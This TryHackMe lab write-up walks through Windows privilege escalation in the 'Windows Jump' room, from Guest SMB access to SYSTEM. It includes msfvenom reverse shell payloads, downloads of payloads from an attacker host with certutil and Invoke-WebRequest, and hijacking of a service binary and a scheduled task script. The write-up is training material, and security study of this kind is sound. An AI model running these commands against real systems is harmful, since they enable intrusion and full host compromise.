# TryHackMe — Windows Jump

> [!WARNING]
> This writeup contains the full exploitation methodology for the **Windows Jump** TryHackMe room.
>
> To preserve the learning experience for others, all flags have been redacted as `THM{REDACTED}`.

> [!NOTE]
> Throughout this writeup, the following placeholders are used:
>
> - `$TARGET_IP` — the TryHackMe target machine
> - `$ATTACKER_IP` — my attacking machine

---

## Room Information

| Category | Value |
|----------|-------|
| Platform | TryHackMe |
| Room | Windows Jump |
| Operating System | Windows |
| Focus | Windows Privilege Escalation |
| Difficulty | Medium |

---

## Attack Path

```text
Guest
 └── SMB Share Enumeration
      ↓
thmuser
 └── AutoLogon Registry Credentials
      ↓
notadmin
 └── Writable Service Binary
      ↓
svcadmin
 └── Writable Scheduled Task
      ↓
NT AUTHORITY\SYSTEM
```

---

## Skills Practiced

- Windows service enumeration
- SMB share enumeration
- Anonymous and Guest account access
- Credential discovery
- Windows Registry enumeration
- AutoLogon credential abuse
- User impersonation with `runas`
- Service binary hijacking
- Windows permission analysis using `icacls`
- Reverse shell deployment
- Scheduled task abuse
- Windows privilege escalation
- Post-exploitation enumeration

---

## What I Learned

This room demonstrates how multiple seemingly minor Windows misconfigurations can be chained together to achieve complete system compromise. Rather than relying on a single vulnerability, the attack progresses through exposed SMB credentials, insecure AutoLogon configuration, writable service binaries, and weak permissions on scheduled task scripts.

The biggest takeaway from this room was the importance of systematic enumeration. Every privilege escalation opportunity was discovered by inspecting the system for common Windows misconfigurations instead of relying on automated exploitation. It reinforced the value of understanding how Windows services, the registry, permissions, and scheduled tasks interact, as these are all common areas where privilege escalation opportunities arise during real-world assessments.

---

# Walkthrough

<details>
<summary><strong>Phase 1 – Initial Access via SMB</strong></summary>

## Objective

Obtain valid user credentials by enumerating accessible SMB shares using the built-in Guest account.

## Enumeration

Begin by performing a full service scan against the target machine.

```bash
nmap -A $TARGET_IP
```

The scan identifies several interesting services:

| Port | Service | Description |
|------:|----------|-------------|
| 445 | SMB | Windows file sharing |
| 3389 | RDP | Remote Desktop Protocol |
| 5985 | WinRM | Windows Remote Management |

Since SMB commonly exposes shared files to network users, it is a logical starting point for enumeration.

List the available SMB shares accessible to the Guest account.

```bash
netexec smb $TARGET_IP -u 'Guest' -p '' --shares
```

Example output:

```text
Public    READ    Public file share
```

The output confirms that the `Guest` account has read access to the `Public` share.

Connect to the share using `smbclient`.

```bash
smbclient //$TARGET_IP/Public -U Guest
```

When prompted for a password, simply press **Enter**, as the Guest account does not require one.

Once connected, enumerate the contents.

```text
smb: \> dir
```

A file named `welcome.txt` is present.

Download it.

```text
smb: \> get welcome.txt
smb: \> exit
```

Inspect its contents.

```bash
cat welcome.txt
```

Example output:

```text
Username : thmuser
Password : Password1!
```

These credentials provide the first authenticated foothold on the target.

Use them to establish an RDP session.

```bash
xfreerdp /v:$TARGET_IP /u:thmuser /p:'Password1!' /dynamic-resolution
```

After successfully authenticating, retrieve the first flag.

```cmd
type C:\Users\thmuser\Desktop\flag1.txt
```

Output:

```text
THM{REDACTED}
```

## Exploitation

No vulnerability is exploited during this phase. Instead, the attack relies on insecure credential storage.

The Guest account is able to access an SMB share containing plaintext credentials for another user. Once valid credentials are obtained, they can be used to authenticate through RDP and establish an interactive session on the system.

## Why This Worked

SMB shares are commonly used to exchange files between users and systems. If share permissions are configured too broadly, even low-privileged or anonymous users may gain access to sensitive information.

In this case, the `Public` share was readable by the built-in `Guest` account and contained a file storing credentials in plaintext. Although Guest accounts are intended to provide minimal access, they are often overlooked during system hardening. Any sensitive information stored in a Guest-accessible share effectively becomes publicly available to anyone who can reach the service.

This demonstrates how a simple permission oversight can lead directly to initial access without requiring exploitation of a software vulnerability.

## Key Takeaways

- Always enumerate SMB shares, even when only Guest or anonymous access is available.
- Public shares frequently expose sensitive files, credentials, or internal documentation.
- Plaintext credential storage represents a significant security risk.
- Initial access often results from poor configuration rather than software vulnerabilities.

</details>

---

<details>
<summary><strong>Phase 2 – AutoLogon Credential Discovery</strong></summary>

## Objective

Escalate from the `thmuser` account to `notadmin` by identifying credentials stored within the Windows Registry.

## Enumeration

Windows supports an AutoLogon feature that automatically authenticates a user during system startup. When enabled, the associated credentials are commonly stored in the registry under the Winlogon configuration.

Query the relevant registry key.

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

Example output:

```text
AutoAdminLogon    REG_SZ    1
DefaultUserName   REG_SZ    notadmin
DefaultPassword   REG_SZ    P@ssw0rd!
```

The registry reveals:

- AutoLogon is enabled.
- The automatically logged-on account is `notadmin`.
- The password is stored in plaintext.

Authenticate as the newly discovered user.

```cmd
runas /user:PRIVESC\notadmin cmd.exe
```

When prompted, provide the recovered password.

Once the new command prompt opens, retrieve the second flag.

```cmd
type C:\Users\notadmin\Desktop\flag2.txt
```

Output:

```text
THM{REDACTED}
```

## Exploitation

The Windows **AutoLogon** feature stores the credentials required for automatic logon within the `Winlogon` registry key. Because the current user has permission to read this registry location, the credentials can be extracted without exploiting any software vulnerability.

Using the recovered password, `runas` allows a new process to be started under the security context of `notadmin`, effectively providing access to a higher-privileged account.

## Why This Worked

AutoLogon is designed for convenience, allowing Windows to automatically sign in a predefined user after boot. To accomplish this, Windows stores the configured username and password in the registry.

If these registry values are readable by standard users, any authenticated user can recover the stored credentials and impersonate the configured account. This makes AutoLogon a common privilege escalation vector when sensitive registry keys are insufficiently protected.

Rather than exploiting a flaw in Windows itself, this phase demonstrates how insecure system configuration can expose privileged credentials.

## Key Takeaways

- Always inspect the `Winlogon` registry key during Windows enumeration.
- AutoLogon credentials are frequently stored in plaintext.
- `runas` provides a straightforward way to leverage recovered credentials.
- Convenience features can unintentionally introduce privilege escalation opportunities.

</details>

---

<details>
<summary><strong>Phase 3 – Service Binary Hijacking</strong></summary>

## Objective

Escalate privileges from the `notadmin` account to the `svcadmin` service account by abusing weak permissions on a Windows service executable.

## Enumeration

Service accounts are commonly used to run Windows background services with privileges different from standard user accounts.

Enumerate all installed services and identify those running under custom accounts.

```cmd
wmic service get name,pathname,startname | findstr /i "svcadmin"
```

Example output:

```text
THMSvc    C:\Windows\THMSVC\svc.exe    .\svcadmin
```

This reveals:

- Service name: `THMSvc`
- Executable: `C:\Windows\THMSVC\svc.exe`
- Service account: `svcadmin`

Next, inspect the permissions on the service directory.

```cmd
icacls C:\Windows\THMSVC\
```

Example output:

```text
PRIVESC\notadmin:(OI)(CI)(F)
```

The `(F)` permission indicates **Full Control**, allowing the current user to modify, replace, or delete files within the directory.

Since the service executes as `svcadmin`, replacing the service executable provides an opportunity to execute arbitrary code with the service account's privileges.

## Exploitation

Generate a Windows service payload from the attacking machine.

```bash
msfvenom \
-p windows/x64/shell_reverse_tcp \
LHOST=$ATTACKER_IP \
LPORT=4444 \
-f exe-service \
-o svc.exe
```

The `exe-service` format is specifically designed to operate as a Windows service. A standard executable may fail when started by the Service Control Manager.

Host the payload.

```bash
python3 -m http.server 8080
```

Start a listener.

```bash
nc -lvnp 4444
```

From the compromised Windows host, download the malicious executable.

```powershell
powershell -c "Invoke-WebRequest -Uri 'http://$ATTACKER_IP:8080/svc.exe' -OutFile 'C:\Windows\THMSVC\svc.exe'"
```

The original service executable is overwritten with the attacker-controlled payload.

Start the service.

```cmd
sc start THMSvc
```

Listener output:

```text
Connection received.

Microsoft Windows [Version 10.0.17763.1821]

C:\Windows\system32> whoami

privesc\svcadmin
```

The shell is now executing under the `svcadmin` account.

Retrieve the third flag.

```cmd
type C:\Users\svcadmin\Desktop\flag3.txt
```

Output:

```text
THM{REDACTED}
```

## Why This Worked

Windows services execute with the privileges assigned to their configured service account.

Although the current user could not directly impersonate `svcadmin`, they possessed **Full Control** over the directory containing the service executable. Replacing the executable effectively hijacks the service.

When the Service Control Manager starts `THMSvc`, Windows launches whatever executable exists at the configured path. Because that executable now contains attacker-controlled code, it runs under the service account instead of the current user.

This is a classic example of **Service Binary Hijacking**, one of the most common Windows privilege escalation techniques.

## Key Takeaways

- Enumerating service permissions is an essential step during Windows privilege escalation.
- `wmic` provides valuable information about service accounts and executable paths.
- `icacls` quickly identifies weak filesystem permissions.
- Writable service executables frequently result in privilege escalation.
- Service payloads should be generated using the `exe-service` format to ensure compatibility with the Service Control Manager.

</details>

---
</details>

<details>
<summary><strong>Phase 4 – Scheduled Task Privilege Escalation</strong></summary>

## Objective

Escalate privileges from the `svcadmin` service account to `NT AUTHORITY\SYSTEM` by abusing weak permissions on a scheduled task script.

## Enumeration

Scheduled tasks are frequently used to automate administrative actions and often execute with elevated privileges.

Inspect the permissions assigned to the scheduled task script.

```cmd
icacls C:\Windows\Tasks\cleanup.bat
```

Example output:

```text
svcadmin:(M)
```

The `(M)` permission indicates **Modify**, allowing the current user to overwrite the contents of the script.

If the scheduled task executes as `SYSTEM`, modifying the script allows arbitrary commands to be executed with the highest level of privileges available on the system.

## Exploitation

Generate a standard reverse shell executable on the attacking machine.

```bash
msfvenom \
-p windows/x64/shell_reverse_tcp \
LHOST=$ATTACKER_IP \
LPORT=4445 \
-f exe \
-o shell.exe
```

Unlike the previous phase, this payload does not need to operate as a Windows service because it will be executed directly from a batch file.

Start another listener.

```bash
nc -lvnp 4445
```

Download the payload onto the target using the built-in `certutil` utility.

```cmd
certutil -urlcache -f http://$ATTACKER_IP:8080/shell.exe C:\Windows\Tasks\shell.exe
```

Overwrite the scheduled task script.

```cmd
echo C:\Windows\Tasks\shell.exe > C:\Windows\Tasks\cleanup.bat
```

The original script is replaced with a single command that launches the malicious executable.

Wait for the scheduled task to execute.

Listener output:

```text
Connection received.

C:\Windows\system32> whoami

nt authority\system
```

The reverse shell now executes with `SYSTEM` privileges.

Retrieve the final flag.

```cmd
type C:\flag4.txt
```

Output:

```text
THM{REDACTED}
```

## Why This Worked

Scheduled tasks execute according to their configured security context rather than the privileges of the user who modified them.

Although `svcadmin` could not directly impersonate `SYSTEM`, it possessed **Modify** permissions over the batch script executed by a scheduled task. By replacing the script with a command that launches an attacker-controlled executable, the scheduled task unknowingly executed arbitrary code as `NT AUTHORITY\SYSTEM`.

This technique demonstrates how weak permissions on scheduled task scripts can provide a direct path to complete system compromise.

## Key Takeaways

- Always enumerate scheduled tasks during Windows privilege escalation.
- Writable scripts executed by privileged scheduled tasks represent a critical security risk.
- `certutil` is a useful built-in utility for transferring files without additional tools.
- Weak file permissions are often enough to achieve full system compromise.

</details>

---

## Flags

| User | Flag |
|------|------|
| `thmuser` | `THM{REDACTED}` |
| `notadmin` | `THM{REDACTED}` |
| `svcadmin` | `THM{REDACTED}` |
| `SYSTEM` | `THM{REDACTED}` |

---

## Techniques Used

- SMB share enumeration
- Guest account abuse
- Plaintext credential discovery
- Windows Registry enumeration
- AutoLogon credential extraction
- User impersonation with `runas`
- Windows service enumeration
- Service binary hijacking
- Reverse shell deployment
- Permission enumeration using `icacls`
- Scheduled task abuse
- Privilege escalation to `NT AUTHORITY\SYSTEM`

---

## MITRE ATT&CK Mapping

| Technique | ATT&CK ID |
|-----------|-----------|
| SMB/Windows Share Discovery | T1135 |
| Valid Accounts | T1078 |
| Credentials from Password Stores (AutoLogon Registry) | T1555 |
| Windows Service Modification | T1543.003 |
| Scheduled Task Abuse | T1053.005 |
| Command and Scripting Interpreter: Windows Command Shell | T1059.003 |
| Ingress Tool Transfer | T1105 |

---

## Final Thoughts

**Windows Jump** is an excellent introduction to Windows privilege escalation through misconfiguration rather than software vulnerabilities. The room demonstrates how seemingly low-risk issues—including exposed SMB shares, AutoLogon credentials, writable service binaries, and scheduled task permissions—can be chained together to achieve complete system compromise.

Rather than focusing on advanced exploits, this room reinforces the importance of thorough enumeration and understanding native Windows components. It is an excellent exercise for anyone looking to build a solid foundation in Windows privilege escalation techniques commonly encountered during penetration testing and Capture The Flag challenges.
